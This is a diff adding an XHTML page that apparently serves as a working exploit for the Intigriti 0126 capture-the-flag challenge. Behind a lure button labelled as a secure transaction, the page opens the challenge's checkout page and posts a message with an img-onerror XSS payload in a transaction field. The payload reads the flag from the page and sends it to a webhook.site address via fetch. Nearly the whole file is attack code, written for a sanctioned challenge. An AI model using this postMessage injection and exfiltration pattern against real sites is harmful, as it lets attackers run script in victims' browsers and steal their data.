@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Exploit - Intigriti 0126</title>
+</head>
+<body style="background-color: #050A0E; color: #00FF88; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>CRYPTIGRITI SECURITY AUDIT</h1>
+    <button id="start" style="padding: 20px 40px; background: #00FF88; border: none; cursor: pointer; font-weight: bold;">
+        CLICK TO INITIALIZE SECURE TRANSACTION
+    </button>
+
+    <script type="text/javascript">
+    //<![CDATA[
+        document.getElementById('start').addEventListener('click', function () {
+            // 1. Open the vulnerable checkout page
+            var checkoutWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000', 'checkout');
+
+            // 2. Wait for the window to load (using a timeout as a fallback for cross-origin restrictions)
+            setTimeout(function() {
+                var payload = {
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: `<img src=x onerror="
+                            const flag = document.body.innerText.match(/INTIGRITI{.*}/);
+                            if(flag) {
+                                alert('FOUND FLAG: ' + flag[0]);
+                                fetch('https://webhook.site/f174d90f-ba4f-4ee9-b67b-bdefbadc2be4/?f=' + btoa(flag[0]));
+                            } else {
+                                alert('XSS Triggered on ' + document.domain);
+                            }
+                        ">`,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                };
+
+                // 3. Send the malicious message
+                checkoutWindow.postMessage(payload, '*');
+            }, 2500); 
+        });
+    //]]>
+    </script>
+</body>
+</html>
